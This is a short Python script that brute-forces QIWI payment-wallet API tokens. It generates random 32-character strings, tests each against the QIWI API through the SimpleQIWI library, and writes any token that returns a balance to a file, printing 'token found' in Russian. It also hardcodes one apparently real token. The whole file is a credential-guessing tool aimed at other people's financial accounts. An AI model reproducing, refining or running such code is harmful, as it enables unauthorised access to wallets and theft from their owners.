import random
from random import randint
from SimpleQIWI import *
import time
from time import sleep
import os
import requests
def start():
    x=0
    phone=''
    m=32
    suc=requests.get('https://vk.com')
    print(suc)
    if suc.status_code==200:
        while True:
            x+=1
            time.sleep(0.3)
            token=(''.join([random.choice(list('a123b4c56e8f90')) for x in range(m)]))
            try:
                api=QApi(token=token,phone=phone)
                if api.balance[0]>=0:
                    print(api.balance[0])
                    print('SUCESFULL - ТОКЕН НАЙДЕН')
                    f=open("suc_full.txt", 'w')
                    f.write(token)
                    f.close()
                    break
            except:
                print('[-]',token)
            if x>99:
                token='88a1c50a96a9a8ee8bb6ad16d64e14e4'
                api=QApi(token=token,phone=phone)
                if api.balance[0]>=0:
                    print(api.balance[0])
                    print('SUCESFULL [++++]')
                    start()
    else:
        print('жепа')
start()
